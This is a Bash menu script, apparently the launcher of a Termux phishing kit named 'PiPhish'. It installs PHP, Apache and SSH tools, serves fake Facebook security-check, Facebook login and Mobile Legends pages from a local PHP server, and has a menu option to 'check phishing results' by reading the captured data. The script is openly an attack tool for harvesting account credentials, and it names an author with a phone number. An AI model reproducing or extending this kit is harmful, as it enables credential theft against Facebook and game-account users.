
clear
echo $pur"____________________________________"
toilet -f future "..::Phising::.."
toilet -f term "   /\_/\ " | lolcat
toilet -f term " =[ •~• ]= Meeeowwww" | lolcat
toilet -f term "    [\]_" | lolcat
toilet -f term "    //   •       •" | lolcat
toilet -f term "           •   •   •" | lolcat
toilet -f term "             •       •" | lolcat
echo $i "v.2 author :Mr.Orx"
echo $i "WA         :08996402259"
echo $pur"____________________________________"
sleep 1
echo
echo $i" when server was started :"
echo $pur"[" $ku"?" $pur"]" $ku" open new session"
echo $pur"[" $ku"?" $pur"]" $ku" run listen.sh"
echo $pur"____________________________________"
echo $pur"["$ku"1"$pur"]"$ku" INSTALL ALL MODULES NEEDED"
echo $pur"["$ku"2"$pur"]"$ku" FACEBOOK SECURE"
echo $pur"["$ku"3"$pur"]"$ku" FACEBOOK LOGIN"
echo $pur"["$ku"4"$pur"]"$ku" FREEFIRE"
echo $pur"["$ku"5"$pur"]"$ku" MOBILE LEGENDS"
echo $pur"["$ku"6"$pur"]"$ku" UPDATE"
echo $pur"["$ku"7"$pur"]"$ku" CEK HASIL PHISHING"
echo $pur"["$ku"8"$pur"]"$ku" EXIT"
echo $pur"____________________________________"
echo $pur"╭─["$pur"root@Phising"$pur"]"
read -p"╰─>> " pil

if [ $pil = 1 ]
then
pkg update
pkg upgrade
apt-get install bash
apt install apache2
pkg install nano
pkg install python2
pkg install ruby toilet figlet
gem install lolcat
apt install openssh
apt install autossh
pkg install php
echo $cy"all modules was succesfuly installed"
sleep 4
sh run.sh
fi

if [ $pil = 2 ]
then
echo $i"chotto a minute kudasai..."
sleep 1
echo $pur"now open new session and run listen.sh"
echo $ku"__________________________________"
sleep 1
echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
php -S localhost:8080 -t /data/data/com.termux/files/home/PiPhish/V1
fi

if [ $pil = 3 ]
then
echo $i"chotto a minute kudasai..."
sleep 1
echo $pur"now open new session and run listen.sh"
echo $ku"_________________________________"
echo $pur"  PHISING FACEBOOK MOBILE LOGIN"
php -S localhost:8080 -t /data/data/com.termux/files/home/PiPhish/V2
fi

if [ $pil = 4 ]
then
echo $i" Coming Soon, need to update "
fi

if [ $pil = 5 ]
then
echo $i"chotto a minute kudasai..."
sleep 1
echo $pur"now open new session and run listen.sh"
echo $ku"_________________________________"
echo $pur"  PHISING MOBILE LEGEND"
php -S localhost:8080 -t ~/PiPhish/ML
fi

if [ $pil = 6 ]
then
git pull
fi

if [ $pil = 7 ]
then
cd ~/PiPhish
sh hasil.sh
fi

if [ $pil = 8 ]
then
echo
echo
echo $pur "Thanks For Using This Tool"
sleep 2
echo $ku "Sampai ketemu lagi gayn:)"
echo
sleep 1
exit
fi
